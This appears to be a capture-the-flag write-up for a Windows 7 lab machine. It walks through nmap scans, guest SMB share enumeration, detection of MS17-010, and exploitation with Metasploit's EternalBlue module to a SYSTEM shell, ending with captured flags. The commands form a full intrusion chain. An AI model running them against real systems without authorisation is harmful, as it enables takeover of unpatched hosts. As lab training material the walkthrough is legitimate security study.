### Summary
From the initial scan we see an old Windows environment with remote procedure call ports and SMB open. With nothing interesting in the guest shares, we perform an `nmap` vulnerability scan to see that the box is vulnerable to `Eternal Blue`. We use `Metasploit` to exploit the vulnerability and get a `root` shell.

### Tools
- `nxc`
- `nmap -script vuln`
- `Metasploit`

##### [[#Recon]]
- [[#Initial Scanning]]
- [[#SMB - TCP 445]]
- [[#Nmap Vulns Script]]
- [[#Eternal Blue (CVE-2017-0143)]]
##### [[#Root Shell]]
- [[#Enumeration]]

---
# Recon
## Initial Scanning
---
```sh
❯ sudo nmap -p- --min-rate 10000 10.129.3.204 -vv -oN nmap/tcp
PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
49152/tcp open  unknown      syn-ack ttl 127
49153/tcp open  unknown      syn-ack ttl 127
49154/tcp open  unknown      syn-ack ttl 127
49155/tcp open  unknown      syn-ack ttl 127
49156/tcp open  unknown      syn-ack ttl 127
49157/tcp open  unknown      syn-ack ttl 127
```
```sh
❯ sudo nmap -p 135,139,445,49152,49153,49154,49155,49156,49157 -sCV 10.129.3.204 -vv -oN nmap/tcpScripts          
PORT      STATE SERVICE      REASON  VERSION
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        syn-ack Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack Microsoft Windows RPC
49155/tcp open  msrpc        syn-ack Microsoft Windows RPC
49156/tcp open  msrpc        syn-ack Microsoft Windows RPC
49157/tcp open  msrpc        syn-ack Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   2.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2026-01-28T18:22:02
|_  start_date: 2026-01-28T17:02:55
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 37591/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 26875/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 41290/udp): CLEAN (Timeout)
|   Check 4 (port 32379/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-01-28T18:22:04+00:00
|_clock-skew: mean: 2s, deviation: 2s, median: 1s
```
- Looks like the `guest` `SMB` account is enabled
- We're also working with `Windows 7 Professional`, very old
- The hostname looks like `HARIS-PC`

- We can generate a `hosts` file with `nxc` and add it to `/etc/hosts`:
```sh
❯ nxc smb 10.129.3.204 --generate-hosts-file hosts
SMB         10.129.3.204    445    HARIS-PC         [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:HARIS-PC) (domain:haris-PC) (signing:False) (SMBv1:True) (Null Auth:True)
❯ cat hosts /etc/hosts | sudo sponge /etc/hosts
```

## SMB - TCP 445
---
- We can log in to the guest account and enumerate shares with the following:
```sh
❯ nxc smb 10.129.3.204 -u 'guest' -p '' --shares
Share           Permissions     Remark        
-----           -----------     ------        
ADMIN$                          Remote Admin  
C$                              Default share 
IPC$                            Remote IPC    
Share           READ                          
Users           READ                          
```
- We can spider and download each file with the following command:
```sh
❯ nxc smb 10.129.3.204 -u 'guest' -p '' -M spider_plus -o DOWNLOAD_FLAG=True
```
- Nothing interesting was fetched

## Nmap Vulns Script
---
- `nmap` has a `vulns` script to inspect if a service is vulnerable
- It didn't work at first until I edited `/etc/ssl/openssl.cnf` to enable legacy `openSSL` protocols
```sh
❯ sudo nmap -p 445 -script vuln -oN nmap/smbVulns 10.129.3.204 -vv
PORT    STATE SERVICE      REASON
445/tcp open  microsoft-ds syn-ack ttl 127

Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
|_smb-vuln-ms10-054: false
```
- The script confirms that this version of `SMB` is vulnerable to `CVE-2017-0143`

## Eternal Blue (CVE-2017-0143)
---
- The easiest way to exploit `Eternal Blue` is with `Metasploit`
```sh
❯ msfconsole   
msf > search CVE-2017-0143
Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
...
```
- We can view the required options with `options` where we see we need to set `RHOSTS`, `LHOST`, and `LPORT`
- Finally, we can run the exploit with `run` and we see that we get a `meterpreter` shell as `SYSTEM`:
```sh
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

# Root Shell
## Enumeration
---
- We can easily grab the flags now once we go from `meterpreter` to a basic `shell`
```powershell
C:\Users>type haris\Desktop\user.txt
type haris\Desktop\user.txt
9b48fb29705868ae2546e807a48d4ec0

C:\Users>type Administrator\Desktop\root.txt
type Administrator\Desktop\root.txt
23ab800bfc757cb0cfef1ca92270b745
```